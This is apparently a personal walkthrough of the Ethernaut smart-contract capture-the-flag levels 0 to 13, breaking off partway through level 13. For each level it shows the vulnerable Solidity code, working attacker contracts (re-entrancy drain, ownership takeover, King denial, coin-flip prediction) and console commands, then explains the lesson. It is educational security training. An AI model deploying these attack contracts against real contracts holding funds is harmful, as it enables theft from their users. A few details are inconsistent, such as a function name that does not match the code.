I decided to do all the OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) levels and write down on how I solved each level.

If you want to do the same, I recommend that you try to solve the levels on your own first. If you are stuck, you can always look at the hints or the solutions.

# Table of Contents
1. [Level 0: Intro](#level-0-intro)
2. [Level 1: Fallback](#level-1-fallback)
3. [Level 2: Fal1out](#level-2-fal1out)
4. [Level 3: Coin Flip](#level-3-coin-flip)
5. [Level 4: Telephone](#level-4-telephone)
6. [Level 5: Token](#level-5-token)
7. [Level 6: Delegation](#level-6-delegation)
8. [Level 7: Force](#level-7-force)
9. [Level 8: Vault](#level-8-vault)
10. [Level 9: King](#level-9-king)
11. [Level 10: Re-entrancy](#level-10-re-entrancy)
12. [Level 11: Elevator](#level-11-elevator)
13. [Level 12: Privacy](#level-12-privacy)
14. [Level 13: Gatekeeper One](#level-13-gatekeeper-one)
15. [Level 14: Gatekeeper Two](#level-14-gatekeeper-two)
16. [Level 15: Naught Coin](#level-15-naught-coin)
17. [Level 16: Preservation](#level-16-preservation)
18. [Level 17: Recovery](#level-17-recovery)
19. [Level 18: MagicNumber](#level-18-magic-number)
20. [Level 19: Alien Codex](#level-19-alien-codex)
21. [Level 20: Denial](#level-20-denial)
22. [Level 21: Shop](#level-21-shop)
23. [Level 22: Dex](#level-22-dex)
24. [Level 22: Dex 2](#level-23-dex-2)
25. [Level 24: Puzzle Wallet](#level-24-puzzle-wallet)
26. [Level 25: Motorbike](#level-25-motorbike)
27. [Level 26: DoubleEntryPoint](#level-26-doubleentrypoint)
28. [Level 27: Good Samaritan](#level-27-good-samaritan)
29. [Level 28: Gaatekeeper Three](#level-28-gatekeeper-three)
30. [Level 29: Switch](#level-29-switch)
31. [Level 30: High Order](#level-30-high-order)
32. [Level 31: Stale](#"level-31-stake")

## Level 0: Intro <a name="level-0-intro"></a>

This level is the intro into Ethernaut and explains how to set up your wallet and how to use the browser console to interact with the contract.

To start the level, you need to click on the “Get new instance button” to get assigned a new vulnerable contract. MetaMask will open up and ask you to sign a transaction. Once the transaction is signed and included in a block, you can use the browser console to interact with the `contract` variable.

If you type `contract.info()` (or `await contract.info()`) it will execute the `info()` method of the contract and you will get an output in your console asking you to call the next method.

After playing around with the methods, you will be asked to authenticate using a password. But what is the password?

Step 8 contains some vital information: Just as you did with the ethernaut contract, you can inspect this contract's ABI through the console using the contract variable.
We are able to inspect the contract’s ABI using the contract variable. Let’s do that.

We will get an object containing some information about the contract: the address, which methods it has,... wait. There is a `password()` method. Let’s call that one.
Alright, having the string, lets authenticate.
Running `contract.authenticate(password)` will open another MetaMask window asking you to sign a transaction.

Once the transaction is included into a block, we hit the submit button and tada -> We provided the right password :)

### Learning
We learned how to interact with a contract using the `contract` variable, how to call methods and how to inspect a contract. We also learned that the password has been saved in a state variable which is declared as public. This causes the compiler to automatically create a getter function for the state variable and we can call it :) So, it is not a good idea to store sensitive information in a contract ;)

## Level 1: Fallback  <a name="level-1-fallback"></a>

The Fallback level is showing us the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

In order to pass the level we have to do the following:
 1. Claim ownership of the contract
 2. Reduce the contracts balance to 0

### First step: Claim ownership
In order to get the ownership of the contract, we are going to have a look at where the `owner` variable is set. There are 2 locations. The first one is in the contribute function.

To become an owner, we would need to contribute more than the actual owner, which is 1000 Eth o.O I don’t have that amount. Do you?
I also don’t see a way of over- or underflowing the value, especially since the SafeMath library is used for uint.

The second location is the receive function. Solidity has two fallback functions: fallback and receive. A fallback function in Solidity is a function within a smart contract that is called if no other function in the contract matches the specified function in the call. This can happen if the call has a typo or if it specifies no function at all. It works, if calldata are included. But it is optionally payable.

The receive() method is used as a fallback function if Ether are sent to the contract and no calldata is provided (no function is specified). It can take any value. If the receive() function doesn’t exist, the fallback() method is used.

We see that the receive function has 2 conditions: msg.value has to be greater than 0 and the sender of the transaction has to have already contributed something.

For the fun of it: Let’s send some Wei to the receive function.
`await contract.sendTransaction({from: player, value:1})`

This transaction reverts :O Well, we haven’t contributed anything before, so let’s do that first ;)

Executing the following command should work `await contract.contribute({value: 1})`

To verify that we really contributed, run `await contract.getContribution()`. It should show that we contribute 1 wei :)

Let’s send some Wei to the receive function again: `await contract.sendTransaction({from: player, value:1})`

Oh yea :D Let’s see if we are the owner now: `await contract.owner() == player` => true 

### Second step: Reduce the contracts balance to 0
Nice. Time to empty the contract: `await contract.withdraw()` and once the transaction has been included into the block: `await getBalance(contract.address)`

You should get a 0. Look at us ;) Time to submit.

### Learning
We learned that Solidity has two types of fallback functions and how to use them. We also learned how to send Ether to a contract and how to withdraw it. There is also the owner contract used to restrict the usage of some methods. Yet, we were able to exploit it :) 

## Level 2: Fal1out  <a name="level-2-fal1out"></a>

The Fal1out level is showing us the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
            require(
                msg.sender == owner,
                "caller is not the owner"
            );
            _;
        }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

Our objective is to become the owner of the contract.

When you read the code you will quickly realize that there is one location, where the owner is set: in the `Fal1out()` function, which has an additional comment that this is a constructor. If you inspect it closely, you will see that it contains a typo :O Instead of the function being called Fallout, it is Fal1out, where one l is a 1. In that case it is not a constructor but just a function of the contract. Ooops.

All you have to do: deploy an instance of the contract, send a transaction invoking the Fal1out function (await contract.Fal1out() )and you are the owner :)

### Learning:
Be careful when naming your constructor. Even better: Do not use named constructor functions, but use the `contructor` keyword instead. In that case you will not make this mistake.

## Level 3: Coin Flip <a name="level-3-coin-flip"></a>
The next level is the coin flip level, where the goal is to guess the correct outcome of a coin flip and build up your winning streak. In order to pass this level you have to guess the correct outcome 10 times in a row 😮

Let’s have a look into the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

Alright, we see that we as user have to provide a guess if in a certain round the blockhash of the previous block divided by a factor is 1 or 0. That means if the blockhash of the previous block can be divided without any rest by the factor.
Big question: How can we guess correctly or rather know the outcome in advance?

From an EOA perspective, we could try to get the blockhash of the previous block, calculate the outcome, send a transaction with a very high gas price and hope that we get into the following block. That is rather impossible. Once a block is published, the validators are starting to work on the next block and our transaction won’t be in the pool. And there is the ‘hope’ factor -> not good enough.

Let’s have a look from a contract perspective: As a contract, we could calculate the guess using the same formula as given in this contract and forward the guess to the CoinFlip contract. Since everything is done in one transaction, it sounds way better than the EOA approach. Let’s get to it.

First our attacker contract:

```solidity
pragma solidity ^0.8.7;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attacker {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlipContract;

    event Win();
    event Loose();

    constructor(address _coinFlipContract) {
        coinFlipContract = CoinFlip(_coinFlipContract);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (coinFlipContract.flip(side)) {
            emit Win();
        } else {
            emit Loose();
        }
    }
}
```

We deploy the contract to Goerli and call attack() 10 times :D 
If you want to check if you have won, you can see if you transaction contains the Win event or just read out the consecutiveWins from the CoinFlip contract on the Ethernaut page using the following line: await contract.consecutiveWins()

### Learning:
While writing contracts, do not forget to think about contracts interacting with your contract. This is a perfect example, where from an EOA perspective, it is very difficult to make up to 10 consecutive guesses. But that changes quickly if you start to use a contract in order to interact with the CoinFlip contract.

## Level 4: Telephone <a name="level-4-telephone"></a>

Time to take ownership of the next contract :)
Let’s have a look at the contract in the Telephone level:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

The `changeOwner()` function has an interesting `if` statement: It changes the owner of the contract only if the origin of the transaction (tx.origin) is unequal to the sender (msg.sender).

What’s the difference between the origin and the sender?

The tx.origin global variable refers to the original external account that started the transaction while msg.sender refers to the immediate account (it could be external or another contract account) that invokes the function.

In order to be able to become the owner, we need to deploy a contract, which calls the `changeOwner()` function. Let’s get into it :)

Our attacker contract:

```solidity
pragma solidity ^0.8.7;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Attacker {
    Telephone telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack() public {
        telephoneContract.changeOwner(address(this));
    }
}
```
Deploy the contract with the address of the Telephone address into the network, send a transaction to `takeOver` and you are already the owner, well done.

### Learning:
While writing contracts, do not forget to think about contracts interacting with your contract. This is a perfect example, where an EOA is not able to change the ownership of the contract, but by putting a proxy contract in between the Telephone contract and you, you are able to change the ownership :) 

## Level 5: Token <a name="level-5-token"></a>

Time to get some more tokens :)
Let’s have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

The description of the level tells us that we start off with 20 tokens. That’s generous. Our objective is to obtain more tokens, ideally a lot more :D

To verify that we really have 20 tokens we call the `balanceOf()` function using the following code: `await contract.balanceOf(player)`

Well, we own 20 tokens :)

So, how do we get more tokens?
Let’s have a look at the `transfer()` function. The transfer checks if the user's balance minus the amount to be transferred is greater than 0.
Since the balances mapping stores units, we can do the following: We would like to transfer 21 tokens to another address. This results into the following calculation: 20-21=2^256-1 and 2^256-1 is definitely greater than 0 :)
So, `await contract.transfer(‘0xSomeAddress’, 21)` should work.
We wait for the transaction to be included into a block.
Now we check our balance and baam. We now own a shit ton of tokens :) Way to go.

### Learning:
Overflows are very common in solidity and must be checked for with control statements such as:
```solidity
if(a + c > a) {
  a = a + c;
}
```
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:
a = a.add(c);
If there is an overflow, the code will revert.

## Level 6: Delegation <a name="level-6-delegation"></a>

The goal of this level is for you to claim ownership of the instance you are given.
Contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

First, let’s have a look at what delegatecall is.

delegatecall is a low level function similar to call.
When contract A executes delegatecall to contract B, B's code is executed
with contract A's storage, `msg.sender` and `msg.value`.

Here an example taken from https://solidity-by-example.org/delegatecall/ 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// NOTE: Deploy this contract first
contract B {
    // NOTE: storage layout must be the same as contract A
    uint256 public num;
    address public sender;
    uint256 public value;

    function setVars(uint256 _num) public payable {
        num = _num;
        sender = msg.sender;
        value = msg.value;
    }
}

contract A {
    uint256 public num;
    address public sender;
    uint256 public value;

    function setVars(address _contract, uint256 _num) public payable {
        // A's storage is set, B is not modified.
        (bool success, bytes memory data) = _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", _num)
        );
    }
}
```

As we can see in the example, the `delegatecall` in contract A gets 2 parameters, the signature of the `setVars()` function to be called in contract B and a parameter for the `setVars()` function.

If we compare it with the contract from the Ethernaut level, we realize, that we have to provide the signature of the `pwn()` function to contract Delegation in msg.data.

So here is what we have to do in the console of the browser:

`await sendTransaction({from: player, to: contract.address, data: web3.eth.abi.encodeFunctionSignature("pwn()")})`

And now you are the owner :) Congrats :)

### Learning:
Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

## Level 7: Force <a name="level-7-force"></a>

We have the following contract in the Force level:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

and out objective is to increase the balance.

In a previous level we learned about fallback functions. If we call a contract where the function signature doesn't match any of the functions in the contract, the fallback function is called. 

In this example there is no payable `fallback()` and no `receive()` function defined. So, there is no way to send Ether to the contract by using an EOA.

Instead we are going to make use of the `selfdestruct()` function. The `selfdestruct()` function is used to destroy the contract and send its funds to a designated address.

Here is the code to do that:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Payer {
    uint public balance = 0;

    function destruct(address payable _beneficiary) external payable {
        selfdestruct(_beneficiary);
    }

    receive() external payable {
        balance += msg.value;
    }
}
```

Deploy the contract, send a small amount of Ether to the contract and call the `destruct()` function with the address of the Force contract. The balance of the Force contract should now be increased by the amount of Ether you sent to the Payer contract.

### Learning:
The `selfdestruct()` function is used to destroy the contract and send its funds to a designated address. It is a dangerous function and should be used with caution.

## Level 8: Vault <a name="level-8-vault"></a>

The Vault level has the following contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

and our task is to unlock the vault.

Let's make sure first that it is indeed locked. Type the following into your console:

`await contract.locked()` and you should get `true`.

The password is stored as a private variable in the contract. We can't access it directly, but we can try to guess it. We can use a brute force attack to try all possible combinations of the password. Let's ...

Just joking - it's bytes32, so it's not possible to brute force it :D Who is going to pay all those gas fees?

Instead, let's just read the storage of the contract :O READ STORAGE YOU SAY?

Yes, read the storage :) Just because a variable is marked as private, it doesn't mean that it is not accessible. It is just a convention to mark it as private, which means for the compiler to not create getter and setter functions. The storage of a contract is public and can be read by anyone.

Here is the code to read the storage:

```bash
curl <rpc endpoint> -X POST -H "Content-Type: application/json" \
  --data '{"method":"eth_getStorageAt","params":["<contract address>", "<slot>", "latest"],"id":1,"jsonrpc":"2.0"}'
```

The slot is the position of the variable in the storage. The password is the second variable in the storage, so the slot is 1.

Once you send the request, you will get a response, which contains the password.

We simply copy the password and call the `unlock()` function with the password as a parameter. The vault is now unlocked.

Time to submit ;)

### Learning:

Just because a variable is marked as private, it doesn't mean that it is not accessible. It is just a convention to mark it as private, which means for the compiler to not create getter and setter functions. The storage of a contract is public and can be read by anyone. Do not store any sensitive information in a contract :)

## Level 9: King <a name="level-9-king"></a>

The King level has the following contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

Our task: To make sure that no one else becomes the king after the obtained the crown.

The contract has a `receive()` function, which is called when the contract receives Ether. The function checks if the value of the Ether sent is greater than or equal to the prize or if the sender is the owner of the contract. If the condition is met, the Ether is transferred to the current king and the sender becomes the new king.

The contract also has a `_king()` function, which returns the address of the current king.

The question is: How can we make sure that we remain the king, no matter what?

Before we look into that, let's see who is currently king: `await contract._king()`
shows us that `0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31` is king.
And let's see how much we have to send in order to become king:
`await contract.prize().then(v => v.toString())` shows us `1000000000000000` Wei.

Alright, let's get to work. 

It is actually rather simple. See the following attack contract:

```solidity
pragma solidity ^0.8.0;

contract KingSlayer {

    function attack(address _contract) public payable {
        (bool sent, ) = _contract.call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }
}
```

Deploy the contract, send a transaction to the `attack()` function with the address of the King contract and the amount of Ether you want to send. The King contract will now receive the Ether and you will become the new king.

If someone else will try to become the king, they will send the Ether and the 
King contract is going to transfer the Ether to our contract. But since our
contract has no fallback or receive function, the transaction will fail and
we will remain the king.

Our contract has to use the `call` function to send the Ether, because the
`transfer` and `send` function would fail in this case, due to the gas limit
of 2300 gas. The receive function of the King contract requires more gas.

### Learning
Look always from the perspective of a Smart Contract. Can another smart contract
break my contract, by not having some functions implemented? 
And since December 2019 - use `call` instead of `transfer` or `send` to send
Ether.

## Level 10: Re-entrancy <a name="level-10-re-entrancy"></a>

The one, the legendary, the whole grail of attacks - at least based on the history involved
where this attack has been used.

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

What does re-entrancy in context of smart contracts mean? It means that a contract calls another contract and the called contract calls back the calling contract before the first call is finished. This can lead to unexpected behavior and can be exploited to drain the funds of the calling contract.


So, here is our attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Reentrance {
    function donate(address _to) virtual external payable;
    function withdraw(uint256 _amount) virtual external;
}

contract Attacker {
    
    Reentrance public re;
    uint public amount_sent;

    constructor(address _contract) {
        re = Reentrance(_contract);
    }

    function attack() external payable {
        amount_sent = msg.value;
        re.donate{value: amount_sent}(address(this));
        re.withdraw(amount_sent);
    }

    receive() external payable {
        uint balanceOfTarget = address(re).balance;
        if (balanceOfTarget >= amount_sent) {
            re.withdraw(amount_sent);
        }
        
    }
}
```

Once our attacker contract is deployed, we are going to call the `attack()` function,
where we send some funds to it. Our contract is going to call the `donate()` function
and forward our funds to the Reentrance contract.

Our contract now holds some funds in the Reentrancy contract.

Now to the attack: We call the `withdraw()` function of the Reentrancy contract. The
Reentrancy contract is going to send the funds to our contract and therefore triggering
our `receive()` function. During the execution of the `receive()` function, we call the
`withdraw()` function of the Reentrancy contract again. Since the balance
has not been updated yet, the Reentrancy contract is going to send the funds again
to our contract. This can be repeated until the Reentrancy contract has no funds left.

Nice, isn't it? :)

### Learning
Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

## Level 11: Elevator

Let's have a code at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

Our goal is to reach the top :)

The contract has a `goTo()` function, which is called with a floor number. The function checks if the floor is the last floor of the building. If it is not, the floor number is updated and the `top` variable is set to the result of the `isLastFloor()` function.

The interesting part is that the `goTo()` function calls another contract to check if the floor is the last floor. Worst part: It uses `msg.sender` as address for the `Building` contract - which is the address of the calling contract.

That means we need to deploy a contract that implements the `Building` interface and call the `goTo()` function of the `Elevator` contract with the address of our contract. The `isLastFloor()` function of our contract will be called and we can return the appropriated bool in order to tell the Elevator contract that we are at the top.

Seeing the statements, we see, that we would need to first return `false` in order to pass the if statement. Then we woiuld need to return `true` in order to set the `top` variable.

Having all those details, here our attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Elevator {
    function goTo(uint256 _floor) virtual external;
}

contract Attacker {
    
    Elevator public re;
    bool called;

    function attack(address _elevator) external payable {
        Elevator e = Elevator(_elevator);
        called = false;
        e.goTo(1);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (!called) {
            called = true;
            return false;
        }
        called = false;
        return true;
    }   
}
```

Deploy the attacker contract and call the `attack()` function with the address of the Elevator contract. The Elevator contract will call the `isLastFloor()` function of the Attacker contract and we can return the appropriated bool in order to tell the Elevator contract that we are at the top.

### Learning

Do not trust other contracts to implement an interface as intended. Always assume that the other contract can be malicious and try to exploit your contract. 

## Level 12: Privacy

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

Our goal is to unlock this contract. In order to do that we need to understand
how the storage of smart contracts work.

Let's have a look. We have 6 state variables which are stored in the contract's
storage, `locked`, `ID`, `flattening`, `denomination`, `awkwardness` and `data`.

Here an explanation from the [Solidity documentation](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html) on storage layout:

```
State variables of contracts are stored in storage in a compact way such that multiple values sometimes use the same storage slot. Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot 0. For each variable, a size in bytes is determined according to its type. Multiple, contiguous items that need less than 32 bytes are packed into a single storage slot if possible, according to the following rules:

* The first item in a storage slot is stored lower-order aligned.
* Value types use only as many bytes as are necessary to store them.
* If a value type does not fit the remaining part of a storage slot, it is stored in the next storage slot.
* Structs and array data always start a new slot and their items are packed tightly according to these rules.
* Items following struct or array data always start a new storage slot.
```

The first state variable is `locked`. It is a boolean and uses 1 byte. The second
state variable is `ID`. It is a uint256 and uses 32 bytes.  Since `ID` requires
32 bytes, it will get an entire storage slot for itself, slot 1, which also
means, that `locked` will be in slot 0.

Next we have `flattening`, `denomination` and `awkwardness`. The first two of type
`uint8` and the last one of type `uint16`. `uint8` means that the value needs
8 bits or 1 byte. `uint16` means that the value needs 16 bits or 2 bytes. Since
`uint8` and `uint16` are smaller than 32 bytes, they will be packed into the
same storage slot. The first one will be stored in the lower-order bits then
move towards the higher-order bits of the second storage slot.

The last state variable and important one is `data`. It is an array of 3 bytes32.
The value at the last index is used to unlock the contract. Since `data` is a
static array of 3 bytes32, each value is stored in its own storage slot, one after
the other. That is the important part for us. This is not a dynamic storage,
where the values are stored in a different location, but they all follow each
other in the storage.

That means, that `data[2]`, which holds for us the important data, is stored in
slot 5. We can read the storage of the contract and get the value of `data[2]`.

Here the code to read the storage for the deployed contract at storage slot 5:

```bash
curl -X POST --data '{"jsonrpc":"2.0", "method": "eth_getStorageAt", "params": ["<contract address>", "0x5", "latest"], "id": 1}' <rpc endpoint>
```
The result is:
```
{"jsonrpc":"2.0","id":1,"result":"<data>"}
```
Nice, we have the data :) Now let's see if we can use the data to `unlock` our
contract. We see that we are required to provide a `bytes16` value but we got
a `bytes32` value. Since we have here a bytes32 value, the following rule
applies during a conversion to a smaller type:

```Fixed-size bytes types behave differently during conversions. They can be thought of as sequences of individual bytes and converting to a smaller type will cut off the sequence:``` [docs](https://docs.soliditylang.org/en/v0.8.16/types.html#explicit-conversions)

That means, we take the first 16 bytes of the data and use it to unlock the contract.

```
await contract.unlock("0x16bytes")
await contract.locked()
```
and tada, we unlocked the contract :)

### Learning

Taken from the level itself: 

> Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

## Level 13: Gatekeeper One <a name="level-13-gatekeeper-one"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
We have to pass the following tests:

```
require(msg.sender != tx.origin);
require(gasleft() % 8191 == 0);
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
require(uint32(uint64(_gateKey)) != uint64(_gateKey)
require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
```

Let's start with the first one. We need a proxy contract in order to pass the first gate. The proxy contract is going to call the `enter()` function of the GatekeeperOne contract. The `msg.sender` of the proxy contract is the contract itself and the `tx.origin` is the original sender of the transaction, which is the player. That means, that the `msg.sender` is not equal to the `tx.origin` and we pass the first gate.

The second one is a bit tricky, since it tests at that point that the gas left is divisible by 8191. We could try to calculate the gas used for the transaction and then calculate the gas left. But that is a bit tricky and error prone, since we would need to get the right compiler version and optimization flags. An alternative is to brute force the gas left. We can send a transaction with a certain amount of gas and see if we pass the gate. If not, we try with a different amount of gas. We can do that in a loop until we find the correct amount of gas. The loop has a range of 8191, since the gas left is divisible by 8191. Once we found the correct amount of gas, we pass the second gate.

Before we get into the third gate, let's check the docs in regards converting between types in Solidity: [docs](https://docs.soliditylang.org/en/v0.8.16/types.html#explicit-conversions)

```
If an integer is explicitly converted to a smaller type, higher-order bits are cut off
```

With that knowledge, let's start with the first require statement. The left hand side of the statement converts the `_gateKey` to
4 bytes, cutting of the high-order 4 bytes. So we get `0xXXXXXXXX`. The right hand side of the statement converts the `_gateKey`
to 2 bytes, cutting of the high-order 6 bytes. So we get `0XXXXX`. Since we test for equality, the statement looks as follows:
`require(0xXXXXXXXX == 0x0000XXXX)`. Which means, that the last 4 bytes of our `_gateKey` need to be something like `0x...0000XXXX`.

Neat, time to check the second require statement. The left hand side of the statement converts the `_gateKey` to 4 bytes, cutting
of the high-order 4 bytes. We get `0xXXXXXXXX`. The right side converts just from bytes8 to uint64, which is still 8 bytes, making
it `0xXXXXXXXXXXXXXXXX`. The test for inequality looks like this: `0x00000000XXXXXXXX != 0xXXXXXXXXXXXXXXXX`. Since we know from the first require statement, that the `_gateKey` has to be `ß`, we get the following test:
`0x000000000000XXXX != 0xXXXXXXXX0000XXXX`.

Since the left side of the statement looks that way due to converts, and the right side is the parameter provided into the function,
we learn, that we have to provide a bytes8 data in the form `0xXXXXXXXX0000XXXX`, where `X` could be any hexadecimal number.

Time for the last require statement :)

